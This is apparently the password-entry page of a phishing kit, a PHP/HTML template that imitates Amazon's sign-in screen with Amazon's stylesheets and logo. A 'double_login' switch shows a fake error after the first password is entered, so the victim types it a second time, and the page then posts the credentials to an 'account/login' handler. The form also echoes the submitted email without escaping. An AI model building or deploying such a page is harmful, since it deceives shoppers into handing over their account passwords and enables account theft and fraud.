<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-05-28">
   <head>
      <title dir="ltr"><?= $lang['title']; ?></title>
      <link rel="apple-touch-icon" sizes="76x76" href="img/logo.png">
      <link rel="icon" type="image/png" href="img/logo.png">
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident">
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41DBI6BbFkL.css_.css?AUIClients/AuthenticationPortalAssets">
      <link rel="stylesheet" href="assets/css/a.css">
   </head>
   <body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
      <div id="a-page">
         <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">
               <div class="a-section a-spacing-medium a-text-center">
                  <a class="a-link-nav-icon" tabindex="-1">
                  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                  </a>
               </div>
            </div>
            <div id="authportal-center-section" class="a-section">
               <div id="authportal-main-section" class="a-section">
                  <div class="a-section auth-pagelet-container">
                     <div class="a-section a-spacing-base">
                           <?php
                           if (isset($_POST['password'])) {
                              echo '<div class="a-section">
                              <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                                 <div class="a-box-inner a-alert-container">
                                    <h4 class="a-alert-heading">'.$lang['die1'].'</h4>
                                    <i class="a-icon a-icon-alert"></i>
                                    <div class="a-alert-content">
                                       <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                          <li>
                                             <span class="a-list-item">'.$lang['die2'].'</span>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                           </div>';
                           }
                           ?>
                        <div class="a-box">
                           <div class="a-box-inner a-padding-extra-large">
                              <h1 class="a-spacing-small">
                                 <?= enc($lang['1']); ?>
                              </h1>
                              <!-- optional subheading element -->
                              <div class="a-row a-spacing-base">
                                 <span><?= $_POST['email']; ?></span>
                                 <a id="ap_change_login_claim" class="a-link-normal" tabindex="6"><?= enc($lang['10']); ?></a>
                              </div>
                                 <?php
                                 if ($double_login == "on") {
                                    if (!isset($_POST['password'])) {
                                       echo '<form method="post" action="" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="YjVZAO79">';
                                    }else{
                                       echo '<form method="post" action="account/login" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="YjVZAO79">';
                                    }
                                 }else{
                                    echo '<form method="post" action="account/login" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="YjVZAO79">';
                                 }
                                 ?>
                                 <div class="a-section">
                                    <input type="hidden" name="email" value="<?= $_POST['email']; ?>" id="ap_email">
                                    <div class="a-section a-spacing-large">
                                       <div class="a-row">
                                          <div class="a-column a-span5">
                                             <label for="ap_password" class="a-form-label"><?= enc($lang['11']); ?></label>
                                          </div>
                                          <div class="a-column a-span7 a-text-right a-span-last">
                                             <a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3"><?= enc($lang['6']); ?></a>
                                          </div>
                                       </div>
                                       <input type="password" maxlength="1024" id="ap_password" name="password" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field" required autofocus>
                                       <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                          <div class="a-box-inner a-alert-container">
                                             <i class="a-icon a-icon-alert"></i>
                                             <div class="a-alert-content"><?= enc($lang['12']); ?></div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="a-section">
                                       <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                                       <?= enc($lang['1']); ?>
                                       </span></span></span>
                                       <div class="a-row a-spacing-top-medium">
                                          <div class="a-section a-text-left">
                                             <label for="auth-remember-me" class="a-form-label">
                                                <div data-a-input-name="rememberMe" class="a-checkbox">
                                             <label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
                                             <?= enc($lang['13']); ?>
                                             <span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;\u003cp>Choosing \&quot;Keep me signed in\&quot; reduces the number of times you're asked to Sign-In on this device.\u003c\/p>\n\u003cp>To keep your account secure, use this option only on your personal devices.\u003c\/p>&quot;}">
                                             <a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative">
                                             <?= enc($lang['14']); ?>
                                             <i class="a-icon a-icon-popover"></i></a>
                                             </span>
                                             </span></label></div>
                                             </label>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </form>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div id="right-2">
            </div>
            <div class="a-section a-spacing-top-extra-large auth-footer">
               <div class="a-divider a-divider-section">
                  <div class="a-divider-inner"></div>
               </div>
               <div class="a-section a-spacing-small a-text-center a-size-mini">
                    <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f1']); ?></a>
                    <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f2']); ?></a>
                    <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f3']); ?></a>
                    <span class="auth-footer-seperator"></span>
               </div>
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  <?= enc($lang['f4']); ?>
                  </span>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>